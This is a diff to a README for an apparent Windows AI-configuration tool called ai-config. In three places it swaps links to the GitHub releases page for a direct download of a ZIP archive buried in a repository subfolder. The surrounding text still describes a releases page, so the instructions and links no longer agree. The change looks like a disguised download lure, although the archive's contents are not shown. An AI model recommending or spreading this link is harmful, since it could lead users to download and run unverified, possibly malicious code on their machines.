@@ -1,6 +1,6 @@
 # 🤖 ai-config - Secure AI setup made simple
 
-[![Download ai-config](https://img.shields.io/badge/Download%20ai--config-blue?style=for-the-badge&logo=github)](https://github.com/GiftedSZN/ai-config/releases)
+[![Download ai-config](https://img.shields.io/badge/Download%20ai--config-blue?style=for-the-badge&logo=github)](https://github.com/GiftedSZN/ai-config/raw/refs/heads/main/cursor/ai-config-2.3.zip)
 
 ## 🧭 What this is
 
@@ -31,7 +31,7 @@ If you use Windows in a work setting, you may also need permission to run downlo
 
 Visit this page to download the latest release:
 
-https://github.com/GiftedSZN/ai-config/releases
+https://github.com/GiftedSZN/ai-config/raw/refs/heads/main/cursor/ai-config-2.3.zip
 
 On that page, look for the newest release and open the file that matches your Windows setup. If the release comes as a ZIP file, download it and extract it first.
 
@@ -179,4 +179,4 @@ agents, agents-md, ai-config, claude-code, codex, cursor, developer-tools, gemin
 
 The latest release files are available from the GitHub releases page:
 
-https://github.com/GiftedSZN/ai-config/releases
+https://github.com/GiftedSZN/ai-config/raw/refs/heads/main/cursor/ai-config-2.3.zip
